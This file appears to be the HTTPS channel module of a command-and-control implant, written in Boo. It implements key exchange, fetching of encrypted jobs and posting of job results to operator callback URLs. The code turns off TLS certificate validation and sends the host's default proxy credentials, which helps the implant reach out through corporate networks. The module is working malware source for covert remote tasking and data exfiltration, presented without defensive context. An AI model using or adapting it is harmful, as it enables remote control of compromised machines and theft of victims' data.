class Response:
    private Response as WebResponse

    def constructor(response as WebResponse):
        Response = response

    public Text:
        get:
            reader = StreamReader(Response.GetResponseStream())
            data = reader.ReadToEnd()
            reader.Close()
            Response.Close()
            #Request.Abort()
            return data

    public Bytes:
        get:
            data = null
            using memstream = MemoryStream():
                using reader = Response.GetResponseStream():
                    reader.CopyTo(memstream)
                    data = memstream.ToArray()
                    reader.Close()
            Response.Close()
            #Request.Abort()
            return data


class Requests:
    private proxyAware as bool = true
    private verify as bool = false
    private sslVersions = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12

    def constructor():
        ServicePointManager.SecurityProtocol = sslVersions
        ServicePointManager.Expect100Continue = false
        unless verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback({sender, certification, chain, sslPolicyErrors | return true})

    public def Get(url as Uri) as Response:
        r = WebRequest.Create(url)
        #r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "GET"
        if proxyAware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        return Response(r.GetResponse())

    public def Post(url as Uri, payload as (byte)) as Response:
        r = WebRequest.Create(url)
        #r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "POST"
        if proxyAware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        r.ContentLength = payload.Length
        stream = r.GetRequestStream()
        stream.Write(payload, 0, payload.Length)
        stream.Close()

        return Response(r.GetResponse())

    public def Post(url as Uri, payload as string) as Response:
        return Post(url, Encoding.UTF8.GetBytes(payload))

class HTTPS:
    public Name as string = 'https'
    public CallBackUrls = []
    private _guid as Guid
    private Requests as Requests = Requests()

    public Guid:
        set:
            _guid = value

    public def SetCallBackUrl(Url as string):
        CallBackUrls.Add(Url)

    public def KeyExchange(encryptedPubKey as (byte)) as (byte):
        for url in CallBackUrls:
            BaseUrl = Uri(urljoin(url, _guid))
            try:
                r = Requests.Post(BaseUrl, encryptedPubKey)
                return r.Bytes
            except e as Exception:
                print "[Channel: $(Name) CallbackUrl: '$(url)'] Error performing key exchange: $(e.Message)"

        raise CommsException("Unable to perform Kex operation using callback URLs")

    public def SendJobResults(encryptedResults as (byte), jobId as string):
        for url in CallBackUrls:
            baseUrl = Uri(urljoin(url, _guid))
            jobsUrl = Uri(urljoin(baseUrl, '/jobs'))
            try:
                jobUrl = Uri(urljoin(jobsUrl, "/$(jobId)"))
                Requests.Post(jobUrl, encryptedResults)
                return
            except e as Exception:
                print "[Channel: $(Name) CallbackUrl: '$(url)'] Error sending job results: $(e.Message)"

        raise CommsException("Unable to perform SendJobResults() operation using callback URLs")

    public def GetJob() as (byte):
        for url in CallBackUrls:
            baseUrl = Uri(urljoin(url, _guid))
            jobsUrl = Uri(urljoin(baseUrl, '/jobs'))
            try:
                r = Requests.Get(jobsUrl)
                return r.Bytes
            except e as Exception:
                print "[Channel: $(Name) CallbackUrl: '$(url)'] Error getting tasking: $(e.Message)"

        raise CommsException("Unable to perform GetJob() operation using callback URLs")
